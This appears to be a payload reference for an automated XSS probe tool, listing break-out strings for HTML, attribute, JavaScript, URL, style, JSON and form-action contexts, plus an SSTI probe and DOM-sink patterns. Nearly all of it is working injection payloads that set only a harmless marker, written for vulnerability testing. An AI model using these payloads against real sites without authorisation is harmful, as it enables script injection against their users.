# XSS Context Corpus

Each row: context → minimal break payload → what "broken" means in the raw response.
The probe script applies these per `--context`. `unknown` runs the master sequence.

## Master sequence (context = unknown)
Sent in this order; first `broken` row wins the classification:
1. `<marquee onstart="__xss_marker=1">` — breaks `html`
2. `" onmouseover="__xss_marker=1" ` — breaks `attr-dq`
3. `' onmouseover="__xss_marker=1" ` — breaks `attr-sq`
4. `"><marquee onstart="__xss_marker=1">` — breaks attr→html transition
5. `</title><marquee onstart="__xss_marker=1">` — breaks `title`/head contexts
6. `</style><marquee onstart="__xss_marker=1">` — breaks `style`
7. `\u003cmarquee onstart="__xss_marker=1"\u003e` — breaks `js-str` (unicode-escaped, survives most JS-string escaping in HTML)
8. `;__xss_marker=1//` — breaks `js-expr` (statement position)
9. `#javascript:__xss_marker=1` — breaks `url`/href (protocol position)
10. `foo"><svg onload="__xss_marker=1">` — double-attr→element
11. `{{7*7}}` — SSTI probe (handoff: rce-hunter)
12. `'><img src=x onerror="__xss_marker=1">` — classic polyglot

## attr-dq  (value inside double quotes: `value="IN"`)
- `" onmouseover="__xss_marker=1" `
- `"/onmouseover="__xss_marker=1" `
- `" autofocus onfocus="__xss_marker=1" `
- `"` + event on every element type (marquee/iframe/svg/img/onerror)
Broken: response contains `onmouseover="__xss_marker=1` **unescaped** (no `&quot;`).

## attr-sq  (value inside single quotes)
- `' onmouseover="__xss_marker=1" `
- `' autofocus onfocus="__xss_marker=1" `
- `'/onmouseover="__xss_marker=1" `

## attr-nq  (unquoted value: `value=IN`)
- ` onmouseover="__xss_marker=1" `
- ` autofocus onfocus="__xss_marker=1" `
- `">` + element injection
Broken: event handler appears as a new attribute in the delivered HTML.

## html  (raw insertion: `value=IN`)
- `<marquee onstart="__xss_marker=1">`
- `<svg onload="__xss_marker=1">`
- `<img src=x onerror="__xss_marker=1">`
- `<iframe srcdoc="<script>__xss_marker=1</script>">`
- `<details open ontoggle="__xss_marker=1">`
Broken: the tag survives as a tag (not encoded as `&lt;`).

## js-str  (JS single-quoted string: `'IN'`)
- `';__xss_marker=1;//`
- `\';__xss_marker=1;//`
- `\u0027;__xss_marker=1;//`
- `');__xss_marker=1;//`
Broken: statement executes after the string close (the marker assignment appears outside quotes in delivered JS).

## js-dq  (JS double-quoted string)
- `";__xss_marker=1;//`
- `\u0022;__xss_marker=1;//`

## js-expr  (expression position: `IN`)
- `;__xss_marker=1//`
- `,__xss_marker=1,`
- `?__xss_marker=1:`
Broken: marker code sits in expression/statement position, unquoted.

## js-comment  (inside `/* IN */` or `// IN`)
- `*/__xss_marker=1;/*`
- `//` + newline + `__xss_marker=1` (encoded `\n`)

## url  (href/src/protocol position: `javascript:IN` or `IN://`)
- `#javascript:__xss_marker=1` (hash routing → location.hash consumers)
- `javascript:__xss_marker=1`
- `data:text/html,<script>__xss_marker=1</script>` (iframe/srcdoc consumers)
Broken: the delivered attribute value contains the executable protocol.

## style  (inside `<style>` or `style=""`)
- `</style><marquee onstart="__xss_marker=1">`
- `;background:url(//x);</style><img src=x onerror="__xss_marker=1">`
- (style attr) `;background:injection;--x:"}<img src=x onerror="__xss_marker=1">`

## form-action  (`action="IN"`)
- `javascript:__xss_marker=1`
- `//host@evil` (protocol-relative open redirect → JS: in some contexts)

## json  (JSON string value inside `<script>` or API)
- `</script><marquee onstart="__xss_marker=1">` — script-escape break (the classic unescaped `</script>` in JSON-in-script)
- `\/` check: if the app escapes `/` as `\/`, the break is unlikely — note it.
Broken: `</script>` appears unescaped.

## dom-sink  (client-side; static proof only here)
Trace in the bundle:
- `element.innerHTML = location.search` / `.hash` / `.href`
- `document.write(location...)`
- `eval(...location...)`, `setTimeout(location...)`, `new Function(location...)`
- `DOMParser` + `document.importNode` (mXSS surface)
- `postMessage` origin check absent (`event.origin` unchecked) → send the marker from a framed page if playwright is available.
- `history.pushState` + hash router re-render loops.
